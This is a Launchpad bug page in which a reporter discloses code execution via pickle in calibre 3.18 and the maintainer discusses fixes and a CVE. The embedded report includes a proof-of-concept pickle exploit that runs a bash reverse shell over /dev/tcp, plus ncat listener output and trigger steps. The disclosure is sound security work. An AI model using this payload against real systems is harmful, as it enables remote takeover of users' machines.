            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T03:27:09.637843+00:00" title="2018-03-07 03:27:09 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>That said, it is probably a good idea to add a warning when the user imports a bookmark file or a library just as there is a warning when adding a plugin. That will be in the newt release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">That said, it is probably a good idea to add a warning when the user imports a bookmark file or a library just as there is a warning when adding a plugin. That will be in the newt release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T03:42:33.163181+00:00" title="2018-03-07 03:42:33 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh and I should note that calibre library exports are exports of all calibre data, including plugins (pickle allowing code execution is really irrelevant there).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Oh and I should note that calibre library exports are exports of all calibre data, including plugins (pickle allowing code execution is really irrelevant there). </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ayrx" class="sprite person">- (ayrx)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T05:24:53.818175+00:00" title="2018-03-07 05:24:53 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the reply.</p>
<p>I agree that the config files being in the pickle format is not directly a security vulnerability. This is why I did not mention them in the actual report. However, changing them in favour of a safer serialisation method is a good idea to consider.</p>
<p>For the actual vulnerability report, I think it is a dangerous idea to write off the threat by saying that bookmarks and export data is considered &quot;untrusted&quot; when it can be triggered from the GUI and it has been shown time and time again that social engineering users to perform certain actions is an effective method of attack. This is especially since there is no good reason that bookmarks or `conversion_<wbr />options` needs to be serialised with pickle instead of something safer like JSON.</p>
<p>I see that you have changed bookmarks to use JSON in commit `aeb5b036a0bf65<wbr />7951756688b3c72<wbr />bd68b6e4a7d`<wbr />. I hope you can do the same for `conversion_<wbr />options` and disclose this report when it is done.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for the reply. 

I agree that the config files being in the pickle format is not directly a security vulnerability. This is why I did not mention them in the actual report. However, changing them in favour of a safer serialisation method is a good idea to consider.

For the actual vulnerability report, I think it is a dangerous idea to write off the threat by saying that bookmarks and export data is considered "untrusted" when it can be triggered from the GUI and it has been shown time and time again that social engineering users to perform certain actions is an effective method of attack. This is especially since there is no good reason that bookmarks or `conversion_options` needs to be serialised with pickle instead of something safer like JSON. 

I see that you have changed bookmarks to use JSON in commit `aeb5b036a0bf657951756688b3c72bd68b6e4a7d`. I hope you can do the same for `conversion_options` and disclose this report when it is done.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T05:42:53.962461+00:00" title="2018-03-07 05:42:53 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>No, I said that exported data (bookmarks and libraries in this case) are both considered *trusted* when importing. For bookmarks, that can be changed to making them untrusted, as I already did. For export data, it is pointless, since, as I said export data contains the entire calibre config, which in turn contains lots of executable code including plugins. Therefore, changing the conversion_options to not use pickle, does not actually achieve anything, since a malicious actor can simply modify some of the other executable code in the export instead. This has been mitigated by displaying a warning to the user informing them of that when importing exported data. There isn&#x27;t anything more that can be done there, since exported data will always contain executable code, so if it is tampered with, it is game over.</p>
<p>As for the general argument of not using pickle, I am sympathetic, and indeed newer calibre code does not use pickle, but some legacy parts remain. None of those legacy parts operate on untrusted data, as far as I know.</p>
<p>And just for completeness, I just made a commit to make unpickling of conversion_options safe. But let me emphasize, once again, that this *does not* make exported data safe.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">No, I said that exported data (bookmarks and libraries in this case) are both considered *trusted* when importing. For bookmarks, that can be changed to making them untrusted, as I already did. For export data, it is pointless, since, as I said export data contains the entire calibre config, which in turn contains lots of executable code including plugins. Therefore, changing the conversion_options to not use pickle, does not actually achieve anything, since a malicious actor can simply modify some of the other executable code in the export instead. This has been mitigated by displaying a warning to the user informing them of that when importing exported data. There isn't anything more that can be done there, since exported data will always contain executable code, so if it is tampered with, it is game over.

As for the general argument of not using pickle, I am sympathetic, and indeed newer calibre code does not use pickle, but some legacy parts remain. None of those legacy parts operate on untrusted data, as far as I know.

And just for completeness, I just made a commit to make unpickling of conversion_options safe. But let me emphasize, once again, that this *does not* make exported data safe.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ayrx" class="sprite person">- (ayrx)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T07:22:11.817716+00:00" title="2018-03-07 07:22:11 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thank you for evaluating my report and pushing out fix so quickly! I must say this is one of the fastest turnarounds of all vulnerabilities I have reported. :)</p>
<p>I would like to make this report public and request a CVE ID to track this issue (specifically the instance where pickle is used for bookmarks export). Do you want to make the request to MITRE for a CVE assignment or shall I do it?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thank you for evaluating my report and pushing out fix so quickly! I must say this is one of the fastest turnarounds of all vulnerabilities I have reported. :)

I would like to make this report public and request a CVE ID to track this issue (specifically the instance where pickle is used for bookmarks export). Do you want to make the request to MITRE for a CVE assignment or shall I do it?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/1753870/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-07T07:41:28.772256+00:00" title="2018-03-07 07:41:28 UTC">on 2018-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/1753870/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Feel free to request a CVE ID yourself and make the bug report public, since the commits fixing it are already public. And thanks for taking the time to investigate the issue and report it :)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Feel free to request a CVE ID yourself and make the bug report public, since the commits fixing it are already public. And thanks for taking the time to investigate the issue and report it :)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~eschwartz" class="sprite person">Eli Schwartz (eschwartz)</a>
    
    <time title="2018-03-09 13:54:29 UTC" datetime="2018-03-09T13:54:29.505679+00:00">on 2018-03-09</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Public &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/calibre/+bug/1753870/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/calibre/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/calibre/+bug/1753870/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/calibre/+bug/1753870/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/calibre/+bug/1753870/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/calibre/+bug/1753870/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/calibre/+bug/1753870/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/calibre/+bug/1753870/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/calibre/+bug/1753870/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/calibre/+bug/1753870/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/calibre/+bug/1753870/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/1753870/+attachment/5071173/+files/part-0001.calibre-data">part-0001.calibre-data</a>
        <small>
          (<a href="/calibre/+bug/1753870/+attachment/5071173">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/calibre/+bug/1753870/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"bug_is_private": false, "information_type_data": {"PUBLICSECURITY": {"name": "Public Security", "description_css_class": "choice-description", "is_private": false, "value": "PUBLICSECURITY", "description": "Everyone can see this security related information.\n", "order": 1}, "PRIVATESECURITY": {"name": "Private Security", "description_css_class": "choice-description", "is_private": true, "value": "PRIVATESECURITY", "description": "Only the security group can see this information.\n ", "order": 2}, "PUBLIC": {"name": "Public", "description_css_class": "choice-description", "is_private": false, "value": "PUBLIC", "description": "Everyone can see this information.\n", "order": 0}, "USERDATA": {"name": "Private", "description_css_class": "choice-description", "is_private": true, "value": "USERDATA", "description": "Only shared with users permitted to see private user information.\n", "order": 3}}, "initial_comment_batch_offset": 41, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1753870", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1753870"}, "first visible_recent_comment": -31, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1753870", "web_link": "https://bugs.launchpad.net/bugs/1753870", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1753870, "private": false, "information_type": "Public Security", "name": null, "title": "Code Execution in Calibre as a resut of the use of Pickle", "description": "A malicious pickle file can be used to trigger remote code execution in\nCalibre E-book Manager.\n\n# Affected Versions\n\nThis vulnerability affects all operating systems Calibre supports and is\npresent in the latest version (3.18) of the application.\n\n# Description\n\nCalibre E-book Manager uses the Python `pickle` module for serialization in\nmultiple places. This is a dangerous pattern because the deserialization of\nmalicious pickle data can result in the execution of arbitrary Python code.\n\nThere are two specific functionality in Calibre where the use of pickle can be\nleveraged by an attacker to obtain code execution by social engineering a\ntarget.\n\nFirstly, Calibre allows users to export and import bookmark data from a\nspecific ebook. `src/calibre/gui2/viewer/bookmarkmanager.py` contains code that\nimports a previously exported file containing bookmark information. This file\ndata is directly passed into `cPickle.load`.\n\n```\n206 files = choose_files(self, 'export-viewer-bookmarks', _('Import bookmarks'),\n207     filters=[(_('Saved bookmarks'), ['pickle'])], all_files=False, select_only_single_file=True)\n208        if not files:\n209            return\n210        filename = files[0]\n211\n212        imported = None\n213        with open(filename, 'rb') as fileobj:\n214            imported = cPickle.load(fileobj)\n```\n\nSecondly, Calibre stores metadata in `metadata.db`, a SQLite database file.\n`src/calibre/db/backend.py` contains code that deserializes data contained in\none of the tables of the database. This code can be triggered by attempting a\nfile format conversion of an ebook.\n\n```\n1694 def conversion_options(self, book_id, fmt):\n1695     for (data,) in self.conn.get('SELECT data FROM conversion_options WHERE book=? AND format=?', (book_id, fmt.upper())):\n1696         if data:\n1697             return cPickle.loads(bytes(data))\n```\n\n# Proof of Concept\n\nFor the proof of concept, we will use a malicious pickle exploited by the below\n`poc.py`.\n\n```python\nimport cPickle\nimport os\nimport base64\nimport pickletools\n\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ((\"bash -i \u003e\u0026 /dev/tcp/127.0.0.1/8000 0\u003e\u00261\"),))\n\nwith open(\"exploit.pickle\", \"wb\") as f:\n    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)\n```\n\nThe exploit will make a reverse shell to a listener on 127.0.0.1:8000, so we\nset that up using `ncat`.\n\n```\n$ ncat -nlvp 8000\n\nNcat: Version 7.60 ( https://nmap.org/ncat )\nNcat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\nNcat: SHA-1 fingerprint: 125E F683 5DA6 153A 6E26 E957 0C92 4706 2596 347C\nNcat: Listening on :::8000\nNcat: Listening on 0.0.0.0:8000\n```\n\nFor the first vulnerability, we open an ebook and navigate to the \"Bookmarks\"\nicon on the left of the screen and click the \"Show/hide bookmarks\" menu item.\nWe then click the \"Import\" button on the bookmarks pane and select the\ngenerated `exploit.pickle` file. This should trigger a reverse shell on our\nlistener.\n\nFor the second vulnerability, we click on the arrow on the right of the\n\"Calibre Library\" icon and click the \"Export/import all calibre data. We then\nclick \"Import previously exported data\" and select the folder containing the\n`part-0001.calibre-data` file (uploaded as an attachment). The file contains\nthe contents of `exploit.pickle` stored in the `data` column of the\n`conversion_options` table. Once the data has been exported, we right click the\nebook in the library and select\n \"Convert books-\u003eConvert individually\" This should trigger a reverse shell on\nour listener.", "owner_link": "https://bugs.launchpad.net/api/devel/~ayrx", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/bug_tasks", "duplicate_of_link": null, "date_created": "2018-03-07T01:45:27.841955+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/subscriptions", "date_last_updated": "2018-03-10T14:47:44.638842+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 256, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/attachments", "security_related": true, "latest_patch_uploaded": null, "tags": [], "date_last_message": "2018-03-07T07:41:28.772256+00:00", "number_of_duplicates": 0, "message_count": 10, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1753870/linked_merge_proposals", "http_etag": "\"937d97cebe6a7a86c33c606b91e58cd09b2ed32c-582bd470a3f05bbd965b953d37cbb451e89a6ad6\""}, "total_comments_and_activity": 14, "related_features": {}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/calibre/+bug/1753870", "web_link": "https://bugs.launchpad.net/calibre/+bug/1753870", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1753870", "milestone_link": null, "status": "Invalid", "importance": "Undecided", "assignee_link": null, "bug_target_display_name": "calibre", "bug_target_name": "calibre", "bug_watch_link": null, "date_assigned": null, "date_created": "2018-03-07T01:45:27.841955+00:00", "date_confirmed": null, "date_incomplete": null, "date_in_progress": null, "date_closed": "2018-03-07T03:05:35.420245+00:00", "date_left_new": "2018-03-07T03:05:35.420245+00:00", "date_triaged": null, "date_fix_committed": null, "date_fix_released": null, "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~ayrx", "target_link": "https://bugs.launchpad.net/api/devel/calibre", "title": "Bug #1753870 in calibre: \"Code Execution in Calibre as a resut of the use of Pickle\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/calibre/+bug/1753870/related_tasks", "is_complete": true, "http_etag": "\"2fbfd304700c4d90b6902179c8a8ca9564a7cb48-936a47a2fbd960df2eb2e6e6dd358bd6e8b91683\""}, "bugtask_data": {"2355349": {"bugtask_path": "/calibre/+bug/1753870", "bug_title": "Code Execution in Calibre as a resut of the use of Pickle", "user_can_delete": false, "milestone_value": null, "milestone_widget_items": "[]", "importance_widget_items": "[]", "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_assignee": false, "targetname": "calibre", "hide_assignee_team_selection": true, "assignee_is_team": null, "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/calibre/+bug/1753870/+delete", "row_id": "tasksummary2355349", "target_is_product": true, "id": 2355349, "form_row_id": "task2355349", "assignee_vocabulary_filters": [], "prefix": "calibre", "importance_value": "Undecided", "status_value": "Invalid", "assignee_value": null, "user_can_edit_milestone": false, "user_can_unassign": false, "user_can_edit_status": true, "user_can_edit_importance": false}}};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 56 queries/external actions issued in 0.61 seconds

    Features: {'app.mainsite_only.canonical_url': None, 'disclosure.dsp_picker.enabled': 'on', 'bugs.affected_count_includes_dupes.disabled': None, 'baselayout.careers_link.disabled': None, 'js.yui_version': None, 'profiling.enabled': None, 'visible_render_time': None, 'hard_timeout': '9000', 'bugs.nominations.bug_supervisors_can_target': 'on', 'app.maintenance_message': None}

    r0d8de2b

    -->

</html>

